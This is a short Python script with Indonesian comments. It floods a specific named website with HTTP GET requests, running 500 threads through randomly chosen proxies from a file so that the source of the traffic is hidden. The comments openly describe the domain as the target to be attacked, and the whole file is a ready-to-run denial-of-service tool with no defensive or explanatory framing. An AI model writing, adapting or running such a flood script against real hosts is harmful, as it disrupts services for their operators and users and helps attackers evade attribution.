import requests
import random
import threading

target_url = 'http://droyalssmp.jasapanel.my.id'  # URL target yang akan diserang
proxy_list_file = 'proxies.txt'  # Nama file yang berisi daftar proxy

def flood_with_proxy(proxy_url):
    try:
        proxy = {'http': f'http://{proxy_url}'}
        response = requests.get(target_url, proxies=proxy)
        print(f"Membanjiri {target_url} melalui proxy {proxy_url}. Status: {response.status_code}")
    except Exception as e:
        print(f"Error: {e}")

def start_flood():
    with open(proxy_list_file, 'r') as file:
        proxy_list = file.read().splitlines()

    flood_threads = []
    for _ in range(500):  # Jumlah thread flood
        proxy_url = random.choice(proxy_list)
        thread = threading.Thread(target=flood_with_proxy, args=(proxy_url,))
        thread.start()
        flood_threads.append(thread)

    for thread in flood_threads:
        thread.join()

start_flood()